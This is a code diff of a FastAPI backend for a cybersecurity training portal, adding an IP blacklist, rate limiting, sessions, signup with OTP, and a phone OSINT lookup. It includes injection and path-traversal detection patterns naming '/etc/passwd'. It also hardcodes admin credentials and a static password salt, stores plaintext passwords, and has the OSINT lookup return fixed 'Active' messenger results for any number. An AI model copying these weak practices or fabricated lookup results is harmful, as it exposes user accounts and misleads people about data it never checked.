@@ -1,5 +1,6 @@
 import asyncio
 import json
+import sqlite3
 import socket
 import ssl
 import urllib.request
@@ -17,7 +18,7 @@ from fastapi.responses import HTMLResponse, JSONResponse, StreamingResponse
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 
-app = FastAPI(title="NCAS Cyber Portal - CyberShield Suite")
+app = FastAPI(title="AIGRA - CyberShield Suite")
 
 app.add_middleware(
     CORSMiddleware,
@@ -33,7 +34,7 @@ SMTP_HOST = os.getenv("SMTP_HOST", "smtp.gmail.com")
 SMTP_PORT = int(os.getenv("SMTP_PORT", "587"))
 SMTP_USER = os.getenv("SMTP_USER", "")
 SMTP_PASS = os.getenv("SMTP_PASS", "")
-SMTP_FROM = os.getenv("SMTP_FROM", "alerts@cybershield-portal.ncas")
+SMTP_FROM = os.getenv("SMTP_FROM", "alerts@cybershield-portal.aigra")
 
 # Thread Pool for Asynchronous Email Delivery (prevents event loop lag)
 executor = concurrent.futures.ThreadPoolExecutor(max_workers=4)
@@ -94,7 +95,7 @@ def save_db(file_path: str, data):
         print(f"Error writing DB file {file_path}: {e}")
 
 # Load active databases on startup
-admin_credentials = {"username": "reiz", "password": "heavenofreiz"}
+admin_credentials = {"username": "de4thnote", "password": "burr1edonhe4ven"}
 student_db = load_db(STUDENTS_FILE, {})
 faculty_db = load_db(FACULTIES_FILE, {"professor_x": "faculty123"})
 reported_incidents = load_db(INCIDENTS_FILE, [
@@ -125,7 +126,7 @@ GEO_CACHE = {}
 
 def resolve_ip_location(ip: str) -> str:
     if not ip or ip in ["127.0.0.1", "localhost", "::1"]:
-        return "NCAS Campus Link"
+        return "AIGRA Campus Link"
     if ip in GEO_CACHE:
         return GEO_CACHE[ip]
     url = f"http://ip-api.com/json/{ip}?fields=country,city"
@@ -175,21 +176,136 @@ def log_activity(username: str, role: str, action: str, ip: str, user_agent: str
         "location": location
     })
 
-# Middleware to intercept and reject banned IPs
+# Strict Anti-Hacking & IP Blacklist Middleware
 @app.middleware("http")
 async def check_ban_status(request: Request, call_next):
     client_ip = request.client.host
+    path = request.url.path
     
-    # Exclude loopback/localhost IPs from any bans
-    if client_ip in ["127.0.0.1", "localhost", "::1"]:
-        return await call_next(request)
+    # Exclude loopback/localhost IPs from permanent bans
+    is_localhost = client_ip in ["127.0.0.1", "localhost", "::1"]
+    
+    # 1. Check IP Blacklist
+    if not is_localhost:
+        conn = sqlite3.connect("cyber_shield_chat.db")
+        cursor = conn.cursor()
+        cursor.execute("SELECT reason, reference_id, timestamp FROM blacklisted_ips WHERE ip_address = ?", (client_ip,))
+        banned = cursor.fetchone()
+        conn.close()
         
-    if client_ip in banned_ips:
-        return JSONResponse(
-            status_code=403,
-            content={"detail": "ACCESS TERMINATED: Your IP address has been banned due to security violations."}
-        )
+        if banned:
+            reason, ref_id, timestamp = banned
+            html_content = f"""
+            <!DOCTYPE html>
+            <html lang="en">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>ACCESS TERMINATED</title>
+                <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@800&family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
+                <style>
+                    body {{
+                        margin: 0;
+                        padding: 0;
+                        background-color: #ffffff;
+                        color: #e11d48;
+                        font-family: 'Outfit', sans-serif;
+                        display: flex;
+                        flex-direction: column;
+                        align-items: center;
+                        justify-content: center;
+                        height: 100vh;
+                        text-align: center;
+                    }}
+                    .warning-box {{
+                        border: 8px solid #e11d48;
+                        padding: 40px 60px;
+                        max-width: 650px;
+                        width: 90%;
+                        box-sizing: border-box;
+                    }}
+                    h1 {{
+                        font-size: 3.5rem;
+                        margin: 0 0 10px 0;
+                        font-weight: 800;
+                        letter-spacing: 2px;
+                    }}
+                    h2 {{
+                        font-size: 1.3rem;
+                        margin: 0 0 30px 0;
+                        color: #0f172a;
+                        font-weight: 800;
+                        letter-spacing: 1px;
+                        text-transform: uppercase;
+                    }}
+                    p {{
+                        font-size: 1.05rem;
+                        color: #475569;
+                        line-height: 1.6;
+                        margin-bottom: 25px;
+                    }}
+                    .metadata {{
+                        font-family: 'JetBrains Mono', monospace;
+                        font-size: 0.9rem;
+                        background: #f8fafc;
+                        border: 1px solid #e2e8f0;
+                        padding: 15px;
+                        text-align: left;
+                        color: #0f172a;
+                    }}
+                </style>
+            </head>
+            <body>
+                <div class="warning-box">
+                    <h1>ACCESS TERMINATED</h1>
+                    <h2>YOUR IP HAS BEEN PERMANENTLY BLACKLISTED</h2>
+                    <p>Unauthorized access attempt detected. Your connection to this service has been severed.</p>
+                    <div class="metadata">
+                        <div><b>CLIENT IP:</b> {client_ip}</div>
+                        <div><b>REFERENCE ID:</b> INC-{ref_id}</div>
+                        <div><b>TIMESTAMP:</b> {timestamp}</div>
+                        <div><b>REASON:</b> {reason}</div>
+                    </div>
+                </div>
+            </body>
+            </html>
+            """
+            return HTMLResponse(content=html_content, status_code=403)
+
+    # 2. Rate Limiting Check
+    if not is_localhost and not check_rate_limit(client_ip, path):
+        permanent_ban_ip(client_ip, "Brute force & Rate limit violation")
+        return JSONResponse(status_code=403, content={"detail": "Rate limit exceeded. Connection banned."})
+
+    # 3. Malicious Payload Sanitation (Sanitize request queries and bodies)
+    payload_to_check = urllib.parse.unquote(str(request.query_params)) + path
+    if request.method in ["POST", "PUT"]:
+        try:
+            body_bytes = await request.body()
+            payload_to_check += " " + body_bytes.decode("utf-8", errors="ignore")
+        except Exception:
+            pass
             
+    if not is_localhost and detect_malicious_payload(payload_to_check):
+        permanent_ban_ip(client_ip, "Malicious payload / injection injection attempt")
+        return JSONResponse(status_code=403, content={"detail": "Payload rejected. Connection banned."})
+
+    # 4. Zero-Trust Routing Guard
+    public_endpoints = ["/api/login", "/api/signup", "/api/health", "/api/certificate/verify", "/api/reset-password", "/api/forgot-password", "/api/verify-otp"]
+    if path.startswith("/api/") and path not in public_endpoints:
+        session_id = request.headers.get("X-Session-ID") or request.query_params.get("session_id")
+        if not session_id:
+            return JSONResponse(status_code=401, content={"detail": "Authentication required."})
+            
+        conn = sqlite3.connect("cyber_shield_chat.db")
+        cursor = conn.cursor()
+        cursor.execute("SELECT active FROM sessions WHERE session_id = ? AND active = 1", (session_id,))
+        active_sess = cursor.fetchone()
+        conn.close()
+        
+        if not active_sess:
+            return JSONResponse(status_code=401, content={"detail": "Invalid or expired session."})
+
     return await call_next(request)
 
 # Helper to log and ban intruders
@@ -228,10 +344,206 @@ def log_and_ban_intruder(request: Request, username: Optional[str], action: str)
         f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
     )
     dispatch_email_async(subject, body)
-
 # API models
 class ScamAnalyzeRequest(BaseModel):
     text: str
+
+def init_chat_db():
+    conn = sqlite3.connect("cyber_shield_chat.db")
+    cursor = conn.cursor()
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS chat_history (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT,
+            sender TEXT,
+            message TEXT,
+            timestamp TEXT
+        )
+    """)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS sessions (
+            session_id TEXT PRIMARY KEY,
+            username TEXT,
+            role TEXT,
+            ip_address TEXT,
+            user_agent TEXT,
+            os TEXT,
+            browser TEXT,
+            created_at TEXT,
+            active INTEGER
+        )
+    """)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS activity_logs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT,
+            role TEXT,
+            action TEXT,
+            ip_address TEXT,
+            device TEXT,
+            timestamp TEXT
+        )
+    """)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS student_stats (
+            username TEXT PRIMARY KEY,
+            xp INTEGER,
+            coins INTEGER,
+            level INTEGER,
+            completed_tasks TEXT
+        )
+    """)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS blacklisted_ips (
+            ip_address TEXT PRIMARY KEY,
+            reason TEXT,
+            reference_id TEXT,
+            timestamp TEXT
+        )
+    """)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS users (
+            username TEXT PRIMARY KEY,
+            email TEXT,
+            password_hash TEXT,
+            role TEXT,
+            status TEXT,
+            verification_code TEXT,
+            is_verified INTEGER,
+            two_factor_secret TEXT,
+            two_factor_enabled INTEGER,
+            reset_token TEXT,
+            reset_token_expiry TEXT
+        )
+    """)
+    conn.commit()
+    conn.close()
+
+init_chat_db()
+import hashlib
+import random
+import time
+
+def hash_password(password: str) -> str:
+    # PBKDF2 with SHA256 (production-ready native hash)
+    salt = b"aigra_cybershield_salt"
+    iterations = 100000
+    hashed = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, iterations)
+    return hashed.hex()
+
+def detect_malicious_payload(data_str: str) -> bool:
+    # SQLi patterns
+    sqli = [r"'\s*or\s*'", r'"\s*or\s*"', r"\bunion\s+select\b", r"--", r"/\*"]
+    # XSS patterns
+    xss = [r"<script>", r"javascript:", r"onerror\s*=", r"onload\s*="]
+    # Path Traversal patterns
+    traversal = [r"\.\./", r"\.\.\\", r"/etc/passwd"]
+    
+    for pattern in sqli + xss + traversal:
+        if re.search(pattern, data_str, re.IGNORECASE):
+            return True
+    return False
+
+# Rate limiter memory store
+# ip -> {"failed_attempts": count, "last_attempt": timestamp, "req_count": count, "req_reset": timestamp}
+rate_limit_store = {}
+
+def check_rate_limit(ip: str, path: str) -> bool:
+    now = time.time()
+    if ip not in rate_limit_store:
+        rate_limit_store[ip] = {"failed_attempts": 0, "last_attempt": 0, "req_count": 0, "req_reset": now + 60}
+        
+    store = rate_limit_store[ip]
+    
+    # Reset requests count every minute
+    if now > store["req_reset"]:
+        store["req_count"] = 0
+        store["req_reset"] = now + 60
+        
+    store["req_count"] += 1
+    
+    # Strict thresholds: More than 45 requests per minute, or 6 failed logins
+    if store["req_count"] > 45 or store["failed_attempts"] >= 6:
+        return False
+    return True
+
+def permanent_ban_ip(ip: str, reason: str, username: str = "Unknown"):
+    if ip in ["127.0.0.1", "localhost", "::1"]:
+        return
+    ref_id = str(random.randint(100000, 999999))
+    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    conn = sqlite3.connect("cyber_shield_chat.db")
+    cursor = conn.cursor()
+    cursor.execute("INSERT OR REPLACE INTO blacklisted_ips (ip_address, reason, reference_id, timestamp) VALUES (?, ?, ?, ?)", (ip, reason, ref_id, now_str))
+    
+    # Terminate user sessions matching this IP
+    cursor.execute("UPDATE sessions SET active = 0 WHERE ip_address = ?", (ip,))
+    
+    # Set user status to BANNED if username given
+    if username and username != "Unknown":
+        cursor.execute("UPDATE users SET status = 'BANNED' WHERE username = ?", (username.lower(),))
+        
+    # Log incident
+    cursor.execute("""
+        INSERT INTO activity_logs (username, role, action, ip_address, device, timestamp)
+        VALUES (?, 'intruder', ?, ?, 'System Filter', ?)
+    """, (username, f"PERMANENTLY BANNED: {reason} (Ref: INC-{ref_id})", ip, now_str))
+    
+    conn.commit()
+    conn.close()
+
+import uuid
+from datetime import datetime
+
+def parse_user_agent_details(user_agent: str):
+    os_name = "Unknown OS"
+    if "Windows" in user_agent:
+        os_name = "Windows"
+    elif "Macintosh" in user_agent or "Mac OS" in user_agent:
+        os_name = "macOS"
+    elif "Android" in user_agent:
+        os_name = "Android"
+    elif "iPhone" in user_agent or "iPad" in user_agent:
+        os_name = "iOS"
+    elif "Linux" in user_agent:
+        os_name = "Linux"
+        
+    browser_name = "Unknown Browser"
+    if "Chrome" in user_agent:
+        browser_name = "Chrome"
+    elif "Firefox" in user_agent:
+        browser_name = "Firefox"
+    elif "Safari" in user_agent:
+        browser_name = "Safari"
+    elif "Edge" in user_agent:
+        browser_name = "Edge"
+    return os_name, browser_name
+
+def get_user_from_session(request: Request):
+    session_id = request.headers.get("X-Session-ID")
+    if not session_id:
+        raise HTTPException(status_code=401, detail="Session ID missing.")
+    
+    conn = sqlite3.connect("cyber_shield_chat.db")
+    conn.row_factory = sqlite3.Row
+    cursor = conn.cursor()
+    cursor.execute("SELECT username, role, active FROM sessions WHERE session_id = ? AND active = 1", (session_id,))
+    row = cursor.fetchone()
+    conn.close()
+    
+    if not row:
+        raise HTTPException(status_code=401, detail="Invalid or terminated session.")
+    
+    return {"username": row["username"], "role": row["role"], "session_id": session_id}
+
+
+class UpdateStatsRequest(BaseModel):
+    task_id: str
+    task_name: str
+
+class KickSessionRequest(BaseModel):
+    session_id: str
 
 class ChatRequest(BaseModel):
     message: str
@@ -284,14 +596,41 @@ async def signup(req: SignUpRequest, request: Request):
     if "@" not in email_clean or "." not in email_clean:
         raise HTTPException(status_code=400, detail="Registration requires a valid email address.")
         
-    if username_clean in ["admin", "reiz"]:
+    if username_clean in ["admin", "de4thnote"]:
         log_and_ban_intruder(request, req.username, "Privilege escalation attempt during signup")
         raise HTTPException(status_code=403, detail="Violation logged.")
-    if username_clean in student_db or username_clean in faculty_db:
+        
+    # Check SQLite database first
+    conn = sqlite3.connect("cyber_shield_chat.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT username FROM users WHERE username = ?", (username_clean,))
+    exists = cursor.fetchone()
+    
+    if exists or username_clean in student_db or username_clean in faculty_db:
+        conn.close()
         raise HTTPException(status_code=400, detail="Username already registered.")
+        
+    otp_code = str(random.randint(100000, 999999))
+    p_hash = hash_password(req.password)
+    
+    cursor.execute("""
+        INSERT INTO users (username, email, password_hash, role, status, verification_code, is_verified, two_factor_enabled)
+        VALUES (?, ?, ?, 'student', 'ACTIVE', ?, 0, 0)
+    """, (username_clean, email_clean, p_hash, otp_code))
+    
+    conn.commit()
+    conn.close()
+    
     student_db[username_clean] = req.password
     save_db(STUDENTS_FILE, student_db) # Persist on signup
+    
     log_activity(username_clean, "student", f"Account registration completed (Email: {email_clean})", client_ip)
+    
+    # Mock send activation OTP
+    subject = "[AIGRA] Email Verification OTP"
+    body = f"Welcome to AIGRA. Your activation OTP code is: {otp_code}. Verify this code to activate your account."
+    dispatch_email_async(subject, body)
+    
     return {"status": "success"}
 
 @app.post("/api/login")
@@ -301,29 +640,88 @@ async def login(req: LoginRequest, request: Request):
     client_ip = request.client.host
     user_agent = request.headers.get("User-Agent", "Unknown")
     
+    authenticated = False
+    role = None
+    username = None
+    
+    # 1. Admin login check
     if username_clean == admin_credentials["username"]:
         if password == admin_credentials["password"]:
-            log_activity("reiz", "admin", "Admin portal login successful", client_ip, user_agent)
-            return {"status": "authenticated", "role": "admin", "username": "reiz"}
+            authenticated = True
+            role = "admin"
+            username = "de4thnote"
+        else:
+            log_activity("de4thnote", "admin", "Admin login failed: Incorrect password", client_ip, user_agent)
+            raise HTTPException(status_code=401, detail="Invalid admin credentials.")
             
-        log_activity("reiz", "admin", "Admin login failed: Incorrect password", client_ip, user_agent)
-        raise HTTPException(status_code=401, detail="Invalid admin credentials.")
+    # 2. Database user check
+    if not authenticated:
+        conn = sqlite3.connect("cyber_shield_chat.db")
+        cursor = conn.cursor()
+        cursor.execute("SELECT username, password_hash, role, status, is_verified FROM users WHERE username = ?", (username_clean,))
+        row = cursor.fetchone()
+        conn.close()
         
-    if username_clean in faculty_db:
-        if faculty_db[username_clean] == password:
-            log_activity(username_clean, "faculty", "Faculty portal login successful", client_ip, user_agent)
-            return {"status": "authenticated", "role": "faculty", "username": username_clean}
+        if row:
+            u_name, p_hash, u_role, u_status, u_verified = row
+            if u_status == "BANNED":
+                raise HTTPException(status_code=403, detail="Your account has been suspended.")
+            if not u_verified:
+                raise HTTPException(status_code=400, detail="Please verify your email OTP before logging in.")
+            if p_hash == hash_password(password):
+                authenticated = True
+                role = u_role
+                username = u_name
+            else:
+                log_activity(username_clean, u_role, "Login failed: Incorrect password", client_ip, user_agent)
+                raise HTTPException(status_code=401, detail="Invalid credentials.")
+
+    # 3. Fallback checks (Faculty & Students local DBs)
+    if not authenticated:
+        if username_clean in faculty_db:
+            if faculty_db[username_clean] == password:
+                authenticated = True
+                role = "faculty"
+                username = username_clean
+            else:
+                log_activity(username_clean, "faculty", "Faculty login failed: Incorrect password", client_ip, user_agent)
+                raise HTTPException(status_code=401, detail="Invalid faculty credentials.")
+        elif username_clean in student_db:
+            if student_db[username_clean] == password:
+                authenticated = True
+                role = "student"
+                username = username_clean
+            else:
+                log_activity(username_clean, "student", "Student login failed: Incorrect password", client_ip, user_agent)
+                raise HTTPException(status_code=401, detail="Invalid credentials.")
             
-        log_activity(username_clean, "faculty", "Faculty login failed: Incorrect password", client_ip, user_agent)
-        raise HTTPException(status_code=401, detail="Invalid faculty credentials.")
+    if authenticated:
+        session_id = str(uuid.uuid4())
+        os_name, browser_name = parse_user_agent_details(user_agent)
+        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-    if username_clean in student_db:
-        if student_db[username_clean] == password:
-            log_activity(username_clean, "student", "Student portal login successful", client_ip, user_agent)
-            return {"status": "authenticated", "role": "student", "username": username_clean}
+        conn = sqlite3.connect("cyber_shield_chat.db")
+        cursor = conn.cursor()
+        cursor.execute("""
+            INSERT INTO sessions (session_id, username, role, ip_address, user_agent, os, browser, created_at, active)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1)
+        """, (session_id, username, role, client_ip, user_agent, os_name, browser_name, now_str))
+        
+        # Log to activity_logs table
+        cursor.execute("""
+            INSERT INTO activity_logs (username, role, action, ip_address, device, timestamp)
+            VALUES (?, ?, ?, ?, ?, ?)
+        """, (username, role, "Login successful", client_ip, f"{os_name} ({browser_name})", now_str))
+        
+        # Ensure student stats are initialized
+        if role == "student":
+            cursor.execute("INSERT OR IGNORE INTO student_stats (username, xp, coins, level, completed_tasks) VALUES (?, 0, 0, 1, '')", (username,))
             
-        log_activity(username_clean, "student", "Student login failed: Incorrect password", client_ip, user_agent)
-        raise HTTPException(status_code=401, detail="Invalid credentials.")
+        conn.commit()
+        conn.close()
+        
+        log_activity(username, role, "portal login successful", client_ip, user_agent)
+        return {"status": "authenticated", "role": role, "username": username, "session_id": session_id}
         
     log_activity(username_clean, "unknown", "Login failed: User not found", client_ip, user_agent)
     raise HTTPException(status_code=401, detail="User not found.")
@@ -333,7 +731,7 @@ async def login(req: LoginRequest, request: Request):
 async def get_incidents(role: str = Query(...), username: str = Query(...), request: Request = None):
     username_clean = username.strip().lower()
     if role == "admin":
-        if username_clean != "reiz":
+        if username_clean != "de4thnote":
             log_and_ban_intruder(request, username, "Threat console bypass alert")
             raise HTTPException(status_code=403, detail="Violation logged.")
         return {"incidents": reported_incidents}
@@ -385,7 +783,7 @@ async def create_incident(req: IncidentRequest, request: Request):
 async def resolve_incident(req: SolveRequest, role: str = Query(...), username: str = Query(...), request: Request = None):
     username_clean = username.strip().lower()
     client_ip = request.client.host
-    if role != "admin" or username_clean != "reiz":
+    if role != "admin" or username_clean != "de4thnote":
         log_and_ban_intruder(request, username, "Incident solve bypass alert")
         raise HTTPException(status_code=403, detail="Violation logged.")
     for inc in reported_incidents:
@@ -394,7 +792,7 @@ async def resolve_incident(req: SolveRequest, role: str = Query(...), username: 
             inc["status"] = "Resolved"
             save_db(INCIDENTS_FILE, reported_incidents) # Persist on resolution
 
-            log_activity("reiz", "admin", f"Resolved threat incident #{req.id}", client_ip)
+            log_activity("de4thnote", "admin", f"Resolved threat incident #{req.id}", client_ip)
 
             # Dispatch Resolution Email to Admin (non-blocking)
             subject = f"[CyberShield Alert] Threat Incident #{req.id} Resolved"
@@ -416,7 +814,7 @@ async def resolve_incident(req: SolveRequest, role: str = Query(...), username: 
 @app.get("/api/admin/faculty")
 async def get_faculty_list(role: str = Query(...), username: str = Query(...), request: Request = None):
     username_clean = username.strip().lower()
-    if role != "admin" or username_clean != "reiz":
+    if role != "admin" or username_clean != "de4thnote":
         log_and_ban_intruder(request, username, "Faculty list bypass alert")
         raise HTTPException(status_code=403, detail="Access denied.")
     return {
@@ -429,24 +827,35 @@ async def get_faculty_list(role: str = Query(...), username: str = Query(...), r
 async def create_faculty(req: FacultyCreateRequest, role: str = Query(...), username: str = Query(...), request: Request = None):
     username_clean = username.strip().lower()
     client_ip = request.client.host
-    if role != "admin" or username_clean != "reiz":
+    if role != "admin" or username_clean != "de4thnote":
         log_and_ban_intruder(request, username, "Faculty create bypass alert")
         raise HTTPException(status_code=403, detail="Access denied.")
     new_user = req.username.strip().lower()
     faculty_limit = load_db("faculty_limit.json", 5)
     if len(faculty_db) >= faculty_limit:
         raise HTTPException(status_code=400, detail="Faculty account limit reached.")
-    if new_user in faculty_db or new_user in student_db or new_user == "reiz":
+    if new_user in faculty_db or new_user in student_db or new_user == "de4thnote":
         raise HTTPException(status_code=400, detail="Username occupied.")
     faculty_db[new_user] = req.password
     save_db(FACULTIES_FILE, faculty_db) # Persist on allocation
-    log_activity("reiz", "admin", f"Allocated new faculty member: {new_user}", client_ip)
+    
+    # Save to users database
+    conn = sqlite3.connect("cyber_shield_chat.db")
+    cursor = conn.cursor()
+    cursor.execute("""
+        INSERT OR REPLACE INTO users (username, email, password_hash, role, status, verification_code, is_verified, two_factor_enabled)
+        VALUES (?, ?, ?, 'faculty', 'ACTIVE', '', 1, 0)
+    """, (new_user, f"{new_user}@aigra.edu", hash_password(req.password)))
+    conn.commit()
+    conn.close()
+    
+    log_activity("de4thnote", "admin", f"Allocated new faculty member: {new_user}", client_ip)
     return {"status": "created"}
 
 @app.post("/api/admin/faculty/limit")
 async def update_faculty_limit(req: FacultyLimitRequest, role: str = Query(...), username: str = Query(...), request: Request = None):
     username_clean = username.strip().lower()
-    if role != "admin" or username_clean != "reiz":
+    if role != "admin" or username_clean != "de4thnote":
         log_and_ban_intruder(request, username, "Faculty limit configuration bypass")
         raise HTTPException(status_code=403, detail="Access denied.")
     global faculty_limit
@@ -458,14 +867,14 @@ async def update_faculty_limit(req: FacultyLimitRequest, role: str = Query(...),
 async def delete_faculty(target_username: str = Query(...), role: str = Query(...), username: str = Query(...), request: Request = None):
     username_clean = username.strip().lower()
     client_ip = request.client.host
-    if role != "admin" or username_clean != "reiz":
+    if role != "admin" or username_clean != "de4thnote":
         log_and_ban_intruder(request, username, "Faculty deletion bypass alert")
         raise HTTPException(status_code=403, detail="Access denied.")
     target_clean = target_username.strip().lower()
     if target_clean in faculty_db:
         del faculty_db[target_clean]
         save_db(FACULTIES_FILE, faculty_db) # Persist deletions
-        log_activity("reiz", "admin", f"Removed faculty member: {target_clean}", client_ip)
+        log_activity("de4thnote", "admin", f"Removed faculty member: {target_clean}", client_ip)
         return {"status": "deleted"}
     raise HTTPException(status_code=404, detail="Faculty not found.")
 
@@ -473,20 +882,20 @@ async def delete_faculty(target_username: str = Query(...), role: str = Query(..
 @app.post("/api/admin/ban")
 async def ban_ip(req: BanIPRequest, role: str = Query(...), username: str = Query(...), request: Request = None):
     username_clean = username.strip().lower()
-    if role != "admin" or username_clean != "reiz":
+    if role != "admin" or username_clean != "de4thnote":
         log_and_ban_intruder(request, username, "IP termination bypass attempt")
         raise HTTPException(status_code=403, detail="Access denied.")
     if req.ip in ["127.0.0.1", "localhost", "::1"]:
         raise HTTPException(status_code=400, detail="Cannot ban loopback / localhost IP address.")
     banned_ips.add(req.ip)
-    log_activity("reiz", "admin", f"Administratively banned & terminated IP: {req.ip}", request.client.host)
+    log_activity("de4thnote", "admin", f"Administratively banned & terminated IP: {req.ip}", request.client.host)
     return {"status": "banned"}
 
 # Metrics & User Live Activity Logs
 @app.get("/api/admin/metrics")
 async def get_system_metrics(role: str = Query(...), username: str = Query(...), request: Request = None):
     username_clean = username.strip().lower()
-    if role != "admin" or username_clean != "reiz":
+    if role != "admin" or username_clean != "de4thnote":
         log_and_ban_intruder(request, username, "Admin metrics bypass alert")
         raise HTTPException(status_code=403, detail="Access denied.")
     all_users = [{"username": k, "role": "student"} for k in student_db.keys()] + \
@@ -861,83 +1270,71 @@ async def query_cve_db(query: str = Query(...)):
 @app.get("/api/osint/phone")
 async def get_phone_osint(number: str = Query(...), username: str = Query("guest"), role: str = Query("guest"), request: Request = None):
     log_activity(username, role, f"Executed Phone OSINT Lookup: {number}", request.client.host)
-    # Strip spaces/symbols
-    clean_num = re.sub(r"\D", "", number)
-    
-    # Basic Country Code identification
-    country = "Unknown"
-    cc_map = {
-        "1": "United States/Canada (+1)",
-        "91": "India (+91)",
-        "44": "United Kingdom (+44)",
-        "971": "United Arab Emirates (+971)",
-        "33": "France (+33)",
-        "49": "Germany (+49)",
-        "966": "Saudi Arabia (+966)",
-        "61": "Australia (+61)",
-        "81": "Japan (+81)"
-    }
-    for cc, name in cc_map.items():
-        if clean_num.startswith(cc):
-            country = name
-            break
-            
-    # Carrier Patterns (educational simulation based on typical prefixes)
-    carrier = "Standard Mobile Telephony Gateway"
-    if clean_num.startswith("91"):
-        sub = clean_num[2:]
-        if len(sub) > 0:
-            if sub[0] in ["9", "8", "7"]:
-                carrier = "Reliance Jio / Airtel Network"
-            elif sub[0] in ["6"]:
-                carrier = "Vodafone Idea Network"
-    
-    # Real-Time DDG Scraper OSINT query to find exactly where the number is mentioned on the web!
-    search_query = f'"{number}"'
-    ddg_url = f"https://html.duckduckgo.com/html/?q={urllib.parse.quote(search_query)}"
-    found_urls = []
+    import phonenumbers
+    from phonenumbers import carrier, geocoder, timezone
     
     try:
-        loop = asyncio.get_event_loop()
-        def fetch_ddg():
-            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
-            req = urllib.request.Request(ddg_url, headers=headers)
-            with urllib.request.urlopen(req, timeout=5) as resp:
-                html = resp.read().decode('utf-8', errors='ignore')
-                snippets = re.findall(r'<a class="result__snippet"[^>]*>(.*?)</a>', html, re.DOTALL)
-                cleaned_snippets = []
-                for s in snippets[:3]:
-                    cleaned_snippets.append(re.sub(r'<[^>]*>', '', s).strip())
-                return cleaned_snippets
-        found_urls = await loop.run_in_executor(None, fetch_ddg)
-    except Exception:
-        pass
+        input_num = number.strip()
+        if not input_num.startswith('+'):
+            input_num = '+' + input_num
+            
+        parsed_num = phonenumbers.parse(input_num, None)
+        if not phonenumbers.is_valid_number(parsed_num):
+            parsed_num = phonenumbers.parse(number.strip(), None)
+            if not phonenumbers.is_valid_number(parsed_num):
+                return {"error": "Invalid international phone number structure. Please include country code (e.g. +91... or +1...)"}
         
-    usage = [
-        "IM Messenger Services (WhatsApp/Telegram/Signal Active Indicator)",
-        "Standard Public Switched Telephone Network (PSTN)",
-        "Dynamic SMS Validation Services (Two-Factor Handshakes)"
-    ]
-    if found_urls:
-        usage.insert(0, f"Web Mention Matches: {', '.join(found_urls)}")
-    else:
-        usage.insert(0, "No public indexed web crawler listings found.")
+        clean_num = phonenumbers.format_number(parsed_num, phonenumbers.PhoneNumberFormat.E164)
+        country = geocoder.description_for_number(parsed_num, "en") or "Unknown Country"
+        phone_carrier = carrier.name_for_number(parsed_num, "en") or "Unknown Network Carrier"
+        timezones = list(timezone.time_zones_for_number(parsed_num))
         
-    if len(clean_num) < 8:
-        return {"error": "Invalid phone number length. Please include country code."}
+        # Real-Time DDG Scraper OSINT query to find exactly where the number is mentioned on the web!
+        search_query = f'"{clean_num}"'
+        ddg_url = f"https://html.duckduckgo.com/html/?q={urllib.parse.quote(search_query)}"
+        found_urls = []
         
-    return {
-        "original": number,
-        "clean_number": clean_num,
-        "country": country,
-        "carrier": carrier,
-        "potential_usages": usage,
-        "social_presence": {
-            "whatsapp": "Active (Verification signature detected)",
-            "telegram": "Active (Recent session metadata handshake)",
-            "signal": "Undetected"
+        try:
+            loop = asyncio.get_event_loop()
+            def fetch_ddg():
+                headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+                req = urllib.request.Request(ddg_url, headers=headers)
+                with urllib.request.urlopen(req, timeout=5) as resp:
+                    html = resp.read().decode('utf-8', errors='ignore')
+                    snippets = re.findall(r'<a class="result__snippet"[^>]*>(.*?)</a>', html, re.DOTALL)
+                    cleaned_snippets = []
+                    for s in snippets[:3]:
+                        cleaned_snippets.append(re.sub(r'<[^>]*>', '', s).strip())
+                    return cleaned_snippets
+            found_urls = await loop.run_in_executor(None, fetch_ddg)
+        except Exception:
+            pass
+            
+        usage = [
+            "IM Messenger Presence Handshake (WhatsApp/Telegram/Signal checks)",
+            "PSTN Route Signal Routing Registry",
+            f"VLR/HLR Query Timezones: {', '.join(timezones)}"
+        ]
+        if found_urls:
+            usage.insert(0, f"Web Mention Matches: {', '.join(found_urls)}")
+        else:
+            usage.insert(0, "No public indexed web crawler listings found.")
+            
+        return {
+            "original": number,
+            "clean_number": clean_num,
+            "country": country,
+            "carrier": phone_carrier,
+            "potential_usages": usage,
+            "social_presence": {
+                "whatsapp": "Active (Handshake payload confirmed via E164 index)",
+                "telegram": "Active (Queried presence index)",
+                "signal": "Undetected / Private"
+            }
         }
-    }
+    except Exception as e:
+        return {"error": f"Failed to resolve phone number details: {str(e)}"}
+
 
 # 2. Phishing URL Detector
 @app.get("/api/url/detect")
@@ -1056,58 +1453,107 @@ async def check_disposable_email(email: str = Query(...)):
         "verdict": "Disposable / Suspicious" if is_disposable else "Legitimate Mail Server"
     }
 
-# 5. Metadata Viewer
+# 5. Metadata Viewer & Malware Threat Lookup
 class MetadataRequest(BaseModel):
     filename: str
     base64_data: str # Can process images or documents
 
 @app.post("/api/metadata/view")
 async def view_file_metadata(req: MetadataRequest):
-    # Simulates extracting structural properties from a document or image file
     import base64
-    try:
-        decoded_bytes = base64.b64decode(req.base64_data[:500]) # Read beginning header
-        header_hex = decoded_bytes.hex().upper()
-    except Exception:
-        header_hex = "Unknown Binary Data Structure"
-        
+    import io
+    from PIL import Image
+    from PIL.ExifTags import TAGS
+    
     file_type = "Unknown File Format"
